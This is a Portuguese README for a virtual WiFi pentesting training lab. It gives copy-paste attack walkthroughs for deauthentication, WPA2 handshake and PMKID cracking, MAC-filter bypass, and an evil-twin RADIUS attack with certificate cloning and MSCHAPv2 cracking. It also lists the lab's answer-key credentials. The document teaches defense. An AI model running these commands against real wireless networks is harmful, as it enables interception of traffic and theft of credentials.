# XPSec Academy | Laboratório de WiFi Pentesting (virtual, sem RF)

Laboratório de WiFi 100% **virtual** para o **Módulo 4** da XPSec Academy. Sobe várias
redes vulneráveis (WPA2-PSK, OPEN, filtro de MAC, PMKID e WPA2-Enterprise)
usando rádios simulados em software (`mac80211_hwsim`). **Nenhum sinal de RF real é
transmitido**, as redes não são visíveis por celulares, notebooks ou qualquer
dispositivo ao redor. Zero risco de expor a rede de um aluno ou deixar uma rede
vulnerável no ar.

---

## Requisitos

- **Kali Linux rolling**, executado como **root**.
- Pacotes: `hostapd`, `wpasupplicant`, `iw`, `rfkill`, `dnsmasq`, `python3`,
  `aircrack-ng` (obrigatórios); `hostapd-wpe`, `hcxdumptool`, `hcxtools`, `asleap`,
  `hashcat`, `macchanger` (opcionais, por cenário).
- **O próprio `--up` instala tudo automaticamente** (via `apt`). Em Kali minimal,
  o `hostapd-wpe` pode exigir o repositório `kali-rolling` habilitado.

---

## Instalação rápida (setup)

No Kali, como root, rode o setup da XPSec Academy — ele baixa e prepara o lab:

```bash
curl -fsSL https://raw.githubusercontent.com/XPSec-Security/wifilab/refs/heads/main/wifilab-setup-academy.sh | sudo bash
```

---

## Uso

O atalho acima sobe o lab, mas não deixa o script salvo. Para usar `--status` e
`--down`, baixe o script uma vez:

```bash
curl -fsSLO https://raw.githubusercontent.com/XPSec-Security/wifilab/refs/heads/main/wifilab-setup-academy.sh
chmod +x wifilab-setup-academy.sh

sudo ./wifilab-setup-academy.sh --up          # instala deps + sobe o lab completo
sudo ./wifilab-setup-academy.sh --install     # só instala as dependências
sudo ./wifilab-setup-academy.sh --status      # mostra o que está no ar
sudo ./wifilab-setup-academy.sh --down        # destrói tudo
```

---

## Redes do lab

| # | SSID | Banda / Canal | Cenário | Credencial / segredo |
|---|------|---------------|---------|----------------------|
| 1 | `XPSEC-WPA2` | 2.4 / 11 | WPA2-PSK fraca | senha `verao2024` |
| 2 | `XPSEC-OPEN` | 2.4 / 3 | Aberta + login HTTP em claro | `funcionario` / `Intranet@2026` |
| 3 | `XPSEC-MACACL` | 2.4 / 9 | Aberta + filtro de MAC | MAC autorizado `02:ca:fe:00:11:22` |
| 4 | `XPSEC-PMKID` | 5 / 36 | WPA2-PSK clientless (PMKID) | senha `familia10` |
| 5 | `XPSEC-CORP` | 5 / 149 | WPA2-Enterprise **legítimo** (RADIUS `CN=radius.xpsec.local`); o evil twin é tarefa do aluno | `funcionario@xpsec.local` / `Senha@Corp123` |

Interface livre para o aluno colocar em monitor: **`mon_lab`**.
Interface managed livre para o atacante (clonar MAC, subir evil twin): **`atk0`**.

---

## Mapa de credenciais (gabarito)

```
XPSEC-WPA2     senha:     verao2024
XPSEC-OPEN     login:     funcionario / Intranet@2026
XPSEC-MACACL   MAC ok:    02:ca:fe:00:11:22
XPSEC-PMKID    senha:     familia10
XPSEC-CORP     EAP:       funcionario@xpsec.local / Senha@Corp123
```

As senhas foram escolhidas para exercitar a criação de wordlists: sazonal+ano
(`verao2024`), afetiva+número (`familia10`) e padrão corporativo (`Senha@Corp123`).

---

# Passo a passo de exploração

Guia prático de ataque para cada rede do lab. **Todos os passos são manuais** — o
lab apenas sobe os alvos; a exploração é sua. Os comandos assumem a interface de
monitor `mon_lab` e a interface de ataque `atk0`, ambas criadas pelo `--up`.

Os blocos de comando estão **prontos para copiar e colar**: a seção 0 descobre os
BSSIDs e os MACs dos clientes e os salva em `/tmp/lab.env`, e as demais seções
usam essas variáveis (`$BSSID_CORP`, `$STA_WPA2_MAC`...). Nada precisa ser
digitado à mão.

> Ética: isto só é legal porque é um lab fechado, virtual e seu. Rodar qualquer um
> destes ataques contra redes de terceiros é crime.

## 0. Preparação — modo monitor e reconhecimento

Coloque a interface livre em modo monitor (captura todos os quadros 802.11 do ar,
não só os destinados a você) e faça uma varredura de 40 s em 2.4 + 5 GHz. A
varredura grava um CSV; o passo 3 lê esse CSV e salva os alvos em `/tmp/lab.env`.

```bash
# 1) modo monitor: derruba, troca o tipo e sobe de novo
sudo ip link set mon_lab down
sudo iw dev mon_lab set type monitor
sudo ip link set mon_lab up

# 2) varredura 2.4 + 5 GHz por 40 s (a tela fecha sozinha) -> /tmp/recon-01.csv
sudo rm -f /tmp/recon-*
sudo timeout -s INT 40 airodump-ng --band abg -w /tmp/recon --output-format csv mon_lab

# 3) extrai do CSV os BSSIDs (pelo SSID) e os clientes (pelo BSSID) -> /tmp/lab.env
csv=/tmp/recon-01.csv
ap()  { awk -F', *' -v s="$1" '$14==s {print $1; exit}' "$csv"; }
sta() { awk -F', *' -v b="$1" '/^Station MAC/{st=1; next} st && $6==b {print $1; exit}' "$csv"; }
cat > /tmp/lab.env <<EOF
BSSID_OPEN=$(ap XPSEC-OPEN)
BSSID_WPA2=$(ap XPSEC-WPA2)
BSSID_MACACL=$(ap XPSEC-MACACL)
BSSID_CORP=$(ap XPSEC-CORP)
STA_WPA2_MAC=$(sta "$(ap XPSEC-WPA2)")
STA_MACACL_MAC=$(sta "$(ap XPSEC-MACACL)")
EOF
cat /tmp/lab.env
```

> **Confira a saída do `cat`:** nenhuma linha pode ficar vazia depois do `=`. Se
> ficar, repita os passos 2 e 3 (um cliente só aparece quando transmite enquanto o
> airodump passa pelo canal dele). Em último caso, preencha à mão com o valor que
> aparece no airodump.
>
> **Em todo terminal novo**, carregue as variáveis antes de seguir:
> `source /tmp/lab.env`

Para só olhar o ar ao vivo: `sudo airodump-ng --band abg mon_lab` (Ctrl+C sai).

| Comando | O que faz |
|---|---|
| `iw dev mon_lab set type monitor` | Põe o rádio em modo monitor (promíscuo de RF). |
| `timeout -s INT 40 airodump-ng --band abg ... --output-format csv` | Escaneia 2.4 GHz (b/g) e 5 GHz (a) por 40 s e grava APs e clientes em CSV. |
| `ap XPSEC-CORP` / `sta <BSSID>` | Leem o CSV: BSSID de um SSID (coluna 14) / cliente associado a um BSSID (coluna 6 da tabela de clientes). |
| `source /tmp/lab.env` | Carrega as variáveis no terminal atual. |

---

## 1. XPSEC-OPEN (2.4 GHz, ch3) — captura de credenciais em texto claro

Rede **aberta**: sem criptografia no ar. Um "funcionário" (bot) faz login HTTP na
intranet a cada poucos segundos. Como não há cifra, o POST com usuário/senha
trafega legível — basta capturar e ler.

```bash
source /tmp/lab.env

# 1) grava 30 s do tráfego do AP aberto (o bot faz login nesse intervalo)
sudo rm -f /tmp/open-*
sudo timeout -s INT 30 airodump-ng -c 3 --bssid "$BSSID_OPEN" -w /tmp/open mon_lab

# 2) extrai o corpo do POST de login, sem abrir GUI
tshark -r /tmp/open-01.cap -Y 'http.request.method=="POST"' -T fields -e http.file_data
#   user=funcionario&pass=Intranet@2026
```

Alternativas:

```bash
# Wireshark (GUI): abra a captura e use o filtro  http.request.method == "POST"
wireshark /tmp/open-01.cap

# captura direta na mon_lab, sem arquivo (Ctrl+C para parar)
sudo iw dev mon_lab set channel 3
sudo tshark -i mon_lab -f 'type data' -Y 'http.request.method=="POST"' -T fields -e http.file_data
```

| Comando | O que faz |
|---|---|
| `rm -f /tmp/open-*` | Apaga capturas antigas: o airodump nunca sobrescreve, criaria `open-02.cap` e o `tshark` leria a velha. |
| `timeout -s INT 30 airodump-ng -c 3 --bssid ... -w /tmp/open` | Trava no canal 3 e grava 30 s do tráfego daquele AP em `/tmp/open-01.cap`. |
| filtro `http.request.method == "POST"` | Isola o envio do formulário de login. |
| `tshark ... -e http.file_data` | Extrai o corpo do POST (`user=funcionario&pass=Intranet@2026`). |

**Resultado:** `funcionario` / `Intranet@2026`.
**Defesa:** nunca trafegar credenciais sem TLS; rede aberta exige portal + HTTPS.

---

## 2. XPSEC-WPA2 (2.4 GHz, ch11) — handshake + quebra offline

WPA2-PSK com senha fraca. A senha nunca passa no ar; o que se captura é o
**4-way handshake** (ao cliente associar). Com ele, testa-se a senha offline.

O lab mantém o cliente `sta_wpa2` **sempre associado e gerando tráfego** (fica
visível como STATION no canal 11 em segundos). Após o deauth ele reconecta
sozinho em ~5s (watchdog), refazendo o 4-way — então a captura é repetível.

**Terminal 1**: grave o canal 11 e deixe rodando.

```bash
source /tmp/lab.env
sudo rm -f /tmp/wpa2-*
sudo airodump-ng -c 11 --bssid "$BSSID_WPA2" -w /tmp/wpa2 mon_lab
```

**Terminal 2**: derrube o cliente e quebre o handshake.

```bash
source /tmp/lab.env

# 1) deauth direcionado ao cliente (-c), mais confiável que broadcast no hwsim
sudo aireplay-ng -0 5 -a "$BSSID_WPA2" -c "$STA_WPA2_MAC" mon_lab
#   quando o Terminal 1 mostrar "WPA handshake: <BSSID>" no topo, pare o airodump (Ctrl+C)

# 2) monte uma wordlist e quebre offline
printf '123456\nverao2024\nadmin123\n' > /tmp/wl.txt
aircrack-ng -w /tmp/wl.txt -b "$BSSID_WPA2" /tmp/wpa2-01.cap
#   KEY FOUND! [ verao2024 ]
```

| Comando | O que faz |
|---|---|
| `airodump-ng -c 11 --bssid ... -w /tmp/wpa2` | Grava os quadros do AP, incluindo o handshake EAPOL. |
| `aireplay-ng -0 5 -a <BSSID> -c <STA_MAC>` | Envia 5 deauth ao cliente alvo → ele reconecta e refaz o handshake. |
| `aircrack-ng -w wl.txt -b <BSSID> cap` | Testa cada senha da wordlist contra o handshake (crack offline). |

> **Dica:** se o handshake não aparecer, confirme que o airodump está **fixo no
> canal 11** (`-c 11`) e repita o `aireplay-ng`. Se `$STA_WPA2_MAC` estiver vazio,
> refaça a varredura da seção 0.

**Resultado:** senha `verao2024`.
**Defesa:** senha longa e aleatória (o 4-way handshake é inquebrável por força
bruta se a PSK tiver entropia alta); de preferência, WPA2-Enterprise.

---

## 3. XPSEC-PMKID (5 GHz, ch36) — ataque clientless (sem cliente, sem deauth)

Técnica moderna: **muitos roteadores/firmwares** incluem o **PMKID** no primeiro
quadro EAPOL (M1), respondido assim que alguém tenta associar. Não precisa de
cliente conectado nem de deauth — o atacante provoca o M1 e extrai o PMKID,
crackeável offline. O PMKID é:

```
PMK   = PBKDF2-HMAC-SHA1(senha, SSID, 4096, 32)
PMKID = HMAC-SHA1(PMK, "PMK Name" | BSSID | MAC_cliente)[:16]
```

> ⚠️ **Nota do lab virtual (importante):** em hardware real você rodaria
> `hcxdumptool -i mon_lab -w pmkid.pcapng` e depois `hcxpcapngtool`. Porém **o
> `hostapd` (usado pelo lab) NÃO vaza o PMKID no M1** — ao contrário de muitos
> roteadores vulneráveis — e o `hcxdumptool` 7.x não opera sob VM/`mac80211_hwsim`.
> Então **não há PMKID para capturar ao vivo** aqui. Para o cenário ser
> reproduzível, o `--up` já materializa em `/tmp/xpsec-wifi-lab/pmkid_capturado.22000`
> **exatamente o PMKID que um AP vulnerável entregaria** (calculado do BSSID real
> + a senha da rede). A **captura é simulada; a quebra abaixo é 100% real.**

```bash
# 0) (em HW real) a captura clientless seria:
#    sudo hcxdumptool -i mon_lab -w /tmp/pmkid.pcapng
#    hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
# No lab, o PMKID "capturado" já está pronto:
cat /tmp/xpsec-wifi-lab/pmkid_capturado.22000      # WPA*01*<pmkid>*<bssid>*<cliente>*<essid>***

# 1) quebre offline com hashcat (modo 22000). --force habilita o backend de CPU
#    (pocl) em VMs sem GPU. Precisa de ~2-3 GB de RAM livre; se a VM for pequena,
#    derrube o lab antes (sudo ./wifilab-setup-academy.sh --down) para liberar RAM.
printf 'familia10\n12345678\n' > /tmp/wlp.txt
hashcat -m 22000 --force /tmp/xpsec-wifi-lab/pmkid_capturado.22000 /tmp/wlp.txt

# 1-alt) VM com pouca RAM (hashcat não cabe)? cracker leve equivalente (PBKDF2 puro):
python3 - /tmp/xpsec-wifi-lab/pmkid_capturado.22000 /tmp/wlp.txt <<'PY'
import sys,hashlib,hmac,binascii
p=open(sys.argv[1]).read().strip().split('*')
tgt,ap,sta,essid=p[2],binascii.unhexlify(p[3]),binascii.unhexlify(p[4]),binascii.unhexlify(p[5])
for w in open(sys.argv[2]):
    w=w.strip()
    if w and hmac.new(hashlib.pbkdf2_hmac('sha1',w.encode(),essid,4096,32),b"PMK Name"+ap+sta,hashlib.sha1).digest()[:16].hex()==tgt:
        print("SENHA:",w); break
PY
```

| Comando | O que faz |
|---|---|
| `cat pmkid_capturado.22000` | O PMKID (formato hashcat `22000`, `WPA*01*…`) que um AP vulnerável vazaria. |
| `hashcat -m 22000 --force` | Quebra o PMKID por wordlist offline (CPU via pocl). |
| cracker Python | Mesma matemática (PBKDF2+HMAC), leve, para VMs sem RAM/GPU. |

**Resultado:** senha `familia10`.
**Defesa:** usar APs que **não** incluem PMKID no M1 (ou desabilitá-lo) e, de novo,
PSK de alta entropia (o PMKID só cai por dicionário/força bruta).

---

## 4. XPSEC-MACACL (2.4 GHz, ch9) — bypass de filtro de MAC

Rede aberta "protegida" por lista branca de MAC. O MAC autorizado trafega em
claro no ar; basta descobri-lo e **cloná-lo** — filtro de MAC não é segurança.

```bash
source /tmp/lab.env
echo "$STA_MACACL_MAC"        # MAC do cliente autorizado, visto no ar (no lab: 02:CA:FE:00:11:22)
#   (opcional) veja ao vivo: sudo airodump-ng -c 9 --bssid "$BSSID_MACACL" mon_lab

# 1) prove que o filtro funciona: com o SEU MAC o AP recusa
sudo ip link set atk0 down
sudo iw dev atk0 set type managed
sudo ip link set atk0 up
sudo iw dev atk0 connect XPSEC-MACACL; sleep 5; sudo iw dev atk0 link
#   Not connected.
sudo iw dev atk0 disconnect 2>/dev/null

# 2) clone o MAC autorizado na interface de ataque
sudo ip link set atk0 down
sudo macchanger -m "$STA_MACACL_MAC" atk0
sudo ip link set atk0 up

# 3) associe-se de novo com o MAC clonado -> filtro furado
sudo iw dev atk0 connect XPSEC-MACACL; sleep 5; sudo iw dev atk0 link
#   Connected to <BSSID_MACACL> ... SSID: XPSEC-MACACL
```

Para voltar ao MAC original depois:
`sudo iw dev atk0 disconnect; sudo ip link set atk0 down; sudo macchanger -p atk0; sudo ip link set atk0 up`

| Comando | O que faz |
|---|---|
| `echo "$STA_MACACL_MAC"` | MAC do cliente que o AP aceita, capturado na varredura (viaja em claro). |
| `iw dev atk0 connect XPSEC-MACACL` + `iw dev atk0 link` | Tenta associar e mostra o resultado (`Not connected.` = recusado). |
| `macchanger -m <MAC> atk0` | Troca o MAC da sua interface para o autorizado (clonagem). |

**Resultado:** acesso à rede apesar do filtro.
**Defesa:** filtro de MAC é só cosmético; use autenticação real (WPA2/Enterprise).

---

## 5. XPSEC-CORP (5 GHz, ch149) — WPA2-Enterprise: evil twin + clonagem de cert

Aqui está o **ataque completo e realista**. O `XPSEC-CORP` é um RADIUS
**legítimo** (`hostapd` + EAP server interno + PKI própria do lab,
`CN=radius.xpsec.local`). A vítima associa nele e **não vaza nada**. Para obter as
credenciais você precisa montar um **evil twin** (RADIUS falso) que capture o
desafio/resposta MSCHAPv2 e, antes, **clonar o certificado** do RADIUS real para
que o rogue pareça idêntico.

### 5.1 Recon — o BSSID do CORP legítimo (canal 149)

```bash
source /tmp/lab.env
echo "$BSSID_CORP"            # BSSID do CORP legítimo (descoberto na seção 0)
#   (opcional) veja o AP e a vítima ao vivo: sudo airodump-ng -c 149 --bssid "$BSSID_CORP" mon_lab
```

### 5.2 (Opcional, realista) Extraia o certificado do RADIUS do ar

No PEAP, o certificado do servidor viaja **em claro**, antes do túnel TLS. Dá para
capturá-lo e ler o `subject`/`CN` que você vai clonar.

Mas ele só vai ao ar **durante uma autenticação EAP**. Só gravar com o airodump
não basta: a vítima autenticou quando o lab subiu, antes da sua captura. Um
deauth nem sempre resolve, porque ao reconectar no mesmo AP ela pode usar o cache
de PMKSA e pular o EAP.

O jeito confiável é **você mesmo** iniciar um PEAP contra o AP legítimo, com
credenciais falsas: o RADIUS envia o certificado para qualquer cliente **antes**
de checar usuário e senha.

**Terminal 1**: grave o canal do CORP e deixe rodando.

```bash
source /tmp/lab.env
sudo rm -f /tmp/corp-*        # sem isso, uma 2ª captura viraria corp-02.cap e o tshark leria a velha
sudo airodump-ng -c 149 --bssid "$BSSID_CORP" -w /tmp/corp mon_lab
```

**Terminal 2**: autentique o `atk0` com uma identidade falsa.

```bash
# libere o atk0: pare o hostapd-wpe se já estiver rodando (Ctrl+C) e, se fez a
# seção 4, desconecte do MACACL
sudo iw dev atk0 disconnect 2>/dev/null
sudo ip link set atk0 down
sudo iw dev atk0 set type managed
sudo ip link set atk0 up
sudo iw dev atk0 scan | grep 'SSID: XPSEC-CORP'     # confirme que enxerga o CORP

cat > /tmp/probe_corp.conf <<'EOF'
network={
    ssid="XPSEC-CORP"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="anonymous"
    password="qualquer"
    phase2="auth=MSCHAPV2"
}
EOF

sudo wpa_supplicant -D nl80211 -i atk0 -c /tmp/probe_corp.conf
#   atk0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/O=XPSec Corp/CN=radius.xpsec.local' ...
#   atk0: CTRL-EVENT-EAP-FAILURE EAP authentication failed   <- esperado (senha falsa)
#   Ctrl+C assim que aparecer o FAILURE
```

Pare o airodump no Terminal 1 (Ctrl+C) e extraia o certificado do `.cap` com o
`tshark`:

```bash
tshark -r /tmp/corp-01.cap -Y 'tls.handshake.type == 11' \
  -T fields -e tls.handshake.certificate | head -1 | cut -d, -f1 | xxd -r -p > /tmp/legit.der
openssl x509 -inform DER -in /tmp/legit.der -noout -subject -issuer -nameopt RFC2253
#   subject=CN=radius.xpsec.local,O=XPSec Corp
#   issuer=CN=XPSec Corp Root CA,O=XPSec Corp
```

Se o filtro não trouxer nada, rode o `tshark` com `-Y eap`: se também vier vazio,
o airodump não estava gravando (canal/BSSID errado) no momento da autenticação.

### 5.3 Clone a identidade do certificado

Gera um certificado self-signed **novo** com o **mesmo subject/CN** do RADIUS
legítimo (o `subject` que você leu no 5.2). Você não tem a chave privada
original — é um *sósia*, suficiente para clientes que não validam a CA (ou que só
olham o CN).

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
  -keyout /tmp/clone.key -out /tmp/clone.pem \
  -subj "/O=XPSec Corp/CN=radius.xpsec.local" \
  -addext "subjectAltName=DNS:radius.xpsec.local"

# parâmetros DH para o TLS do hostapd-wpe
openssl dhparam -dsaparam -out /tmp/dh.pem 2048

# confira que o sósia tem o subject certo:
openssl x509 -in /tmp/clone.pem -noout -subject -issuer -nameopt RFC2253
#   subject=CN=radius.xpsec.local,O=XPSec Corp
```

### 5.4 Suba o evil twin (rogue RADIUS) com o cert clonado

Crie a config do `hostapd-wpe` apontando para o cert clonado. Use um canal
**diferente** do legítimo (ex.: 153) para a vítima migrar para você.

```bash
cat > /tmp/evil_corp.conf <<'CONF'
interface=atk0
driver=nl80211
ssid=XPSEC-CORP
country_code=US
ieee80211d=1
hw_mode=a
channel=153
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/tmp/clone.pem
server_cert=/tmp/clone.pem
private_key=/tmp/clone.key
dh_file=/tmp/dh.pem
CONF

# prepare a interface de ataque e suba o rogue (fica em foreground, capturando)
sudo iw dev atk0 disconnect 2>/dev/null
sudo ip link set atk0 down
sudo iw dev atk0 set type managed
sudo ip link set atk0 up
sudo stdbuf -oL hostapd-wpe -s /tmp/evil_corp.conf | tee /tmp/evil_corp.log
```

O `tee` mostra a saída na tela **e** grava em `/tmp/evil_corp.log` (o 5.6 lê
desse arquivo); o `stdbuf -oL` faz as linhas aparecerem na hora, em vez de ficarem
presas no buffer do pipe. Deixe este terminal aberto.

### 5.5 Deauth — force a vítima a migrar do legítimo para o rogue

**Noutro terminal**, bombardeie o AP legítimo (ch149) com deauth contínuo. Sem
conseguir ficar no legítimo, a vítima reassocia no seu evil twin (mesmo SSID).

```bash
source /tmp/lab.env
sudo iw dev mon_lab set channel 149     # o aireplay injeta no canal atual da mon_lab
sudo aireplay-ng -0 0 -a "$BSSID_CORP" mon_lab
#   -0 0 = deauth infinito. Pare (Ctrl+C) quando o terminal do hostapd-wpe
#   mostrar um bloco "mschapv2:" com username / challenge / response
```

### 5.6 Capture e crackeie o MSCHAPv2

Quando a vítima faz PEAP contra o seu rogue, o `hostapd-wpe` imprime usuário +
challenge + response (e o `tee` grava em `/tmp/evil_corp.log`). Pode parar o
`hostapd-wpe` (Ctrl+C) e quebrar offline:

```bash
# challenge e response da primeira captura do log
grep -A4 'mschapv2:' /tmp/evil_corp.log | head -5          # confira o bloco capturado
CH=$(grep -m1 'challenge:' /tmp/evil_corp.log | awk '{print $2}')
RESP=$(grep -m1 'response:' /tmp/evil_corp.log | awk '{print $2}')
echo "challenge=$CH"; echo "response=$RESP"

# wordlist com variações do padrão corporativo + quebra com asleap
printf 'Senha@2024\nSenha@Corp2025\nSenha@Corp123\n' > /tmp/wlc.txt
asleap -C "$CH" -R "$RESP" -W /tmp/wlc.txt
#   password: Senha@Corp123
```

Numa auditoria real use uma wordlist grande. No Kali a rockyou vem compactada:
`sudo gunzip /usr/share/wordlists/rockyou.txt.gz` e depois
`asleap -C "$CH" -R "$RESP" -W /usr/share/wordlists/rockyou.txt`.
Alternativa ao asleap: `hashcat -m 5500` (formato NETNTLMv1).

| Comando | O que faz |
|---|---|
| `wpa_supplicant -i atk0 -c /tmp/probe_corp.conf` | Inicia um PEAP com credenciais falsas só para o RADIUS legítimo enviar o certificado. |
| `tshark ... -e tls.handshake.certificate` | Extrai o certificado (DER) do `.cap` sem abrir GUI. |
| `openssl req -x509 ... -subj "/.../CN=radius.xpsec.local"` | Gera o cert *sósia* com a identidade do RADIUS real. |
| `stdbuf -oL hostapd-wpe -s ... \| tee /tmp/evil_corp.log` | Sobe o RADIUS falso (evil twin), captura o MSCHAPv2 e grava a saída em log. |
| `aireplay-ng -0 0 -a "$BSSID_CORP"` | Deauth infinito no AP legítimo → empurra a vítima para o rogue. |
| `asleap -C -R -W` | Quebra o par challenge/response para recuperar a senha. |

**Resultado:** `funcionario@xpsec.local` / `Senha@Corp123`.

> **Por que clonar o cert se a vítima do lab nem valida a CA?** Porque é a
> *tradecraft* real: clientes corporativos costumam checar o CN e exibem aviso de
> certificado — o clone deixa o rogue indistinguível do RADIUS verdadeiro, e
> derrota clientes que validam só o `subject`.
>
> **Defesa (a que realmente para o ataque):** no cliente, fixar `ca_cert` na CA da
> empresa **e** `domain_suffix_match=radius.xpsec.local`. Aí o sósia (não assinado
> pela CA real) é rejeitado e o evil twin falha. Sem `ca_cert`, o certificado do
> servidor não é verificado — é a má configuração que todo este ataque explora.

---

## Destruir o lab

```bash
sudo ./wifilab-setup-academy.sh --down     # derruba APs/clientes e descarrega o hwsim
```
